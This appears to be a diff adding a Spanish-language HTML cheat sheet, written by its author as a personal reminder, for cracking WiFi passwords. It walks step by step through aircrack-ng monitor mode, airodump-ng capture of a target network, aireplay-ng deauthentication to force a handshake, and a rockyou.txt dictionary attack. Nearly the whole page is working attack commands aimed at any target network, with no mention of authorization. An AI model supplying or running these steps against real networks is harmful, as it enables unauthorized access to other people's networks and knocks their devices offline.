@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Guía de Comandos - Seguridad WiFi</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <h1>Guía de Comandos para Ataques WiFi <br> by Christian magallanes</h1>
+        <p>definitivamente aprendi el hacking de wifi y hoy quiero dejar esta guia paso a paso para repasar cada vez que no recuerde los pasos</p>
+        <h2>requisitos: parrot os security, aricrack-ng, diccionario como rockyou.txt</h2>
+        <div class="div-enlaces">
+            <h2>enlaces de descargas:</h2>
+            <a class="enlaces" href="https://parrotsec.org/download/"><img class="img-enlace" src="./assets/descargar.png" alt="">parrot security</a>
+            <a class="enlaces" href="https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt&ved=2ahUKEwjPhvjO0tOJAxW-LrkGHZpwOfMQFnoECAsQAQ&usg=AOvVaw3snAERl1mU6Ccr4WFEazBd"><img class="img-enlace" src="./assets/descargar.png" alt=""> rockyou.txt</a>
+            
+        </div>
+        <section>
+            <h2>Paso 1: Descargar el Diccionario rockyou.txt</h2>
+            <p><code>debemos guardar el mismo en una carpeta, luego abrimos una terminal desde la ruta de la carpeta que contenga el rockyou.txt</code></p>
+        </section>
+        <h2>Paso 2: instalar aircrack-ng</h2>
+        <p><code>sudo apt install aircrack-ng</code></p>
+        </section>
+        
+        <section>
+            <h2>Paso 3: Verificar la interfaz WiFi</h2>
+            <p>Usar el siguiente comando para ver la interfaz de red WiFi:</p>
+            <p><code>ifconfig</code></p>
+        </section>
+
+        <section>
+            <h2>Paso 4: Iniciar modo monitor</h2>
+            <p>Activar el modo monitor en la interfaz WiFi:</p>
+            <p><code>sudo airmon-ng start (NOMBRE_DE_LA_INTERFAZ)</code></p>
+            <p>La interfaz cambiará de <code>wlan0</code> a <code>wlan0mon</code>.</p>
+        </section>
+
+        <section>
+            <h2>Paso 5: Escanear las redes disponibles</h2>
+            <p>Listar las redes WiFi al alcance:</p>
+            <p><code>sudo airodump-ng wlan0mon</code></p>
+        </section>
+
+        <section>
+            <h2>Paso 6: Ataque a la red</h2>
+            <p>Copiar el <code>BSSID</code> y el <code>CANAL</code> de la red objetivo.</p>
+            <p>Para capturar tráfico y hacer el ataque con diccionario:</p>
+            <p><code>sudo airodump-ng -c (canal) --bssid (bssid) -w auditoria wlan0mon</code></p>
+            <p>Opción alternativa:</p>
+            <p><code>airodump-ng -w capture --bssid (bssid) wlan0mon</code></p>
+        </section>
+
+        <section>
+            <h2>Paso 7: Obtener el Handshake</h2>
+            <p>Esperar a que una STATION se conecte a la red y ejecutar:</p>
+            <p><code>sudo aireplay-ng -0 5 -a (bssid) -c (station) wlan0mon</code></p>
+            <p>Ejecutar varias veces hasta obtener el <i>handshake</i>.</p>
+        </section>
+
+        <section>
+            <h2>Paso 8: Ataque Final</h2>
+            <p>Usar el diccionario <code>rockyou.txt</code> para descifrar la clave:</p>
+            <p><code>sudo aircrack-ng -b (handshake) -w rockyou.txt auditoria-01.cap</code></p>
+        </section>
+    </div>
+</body>
+</html>
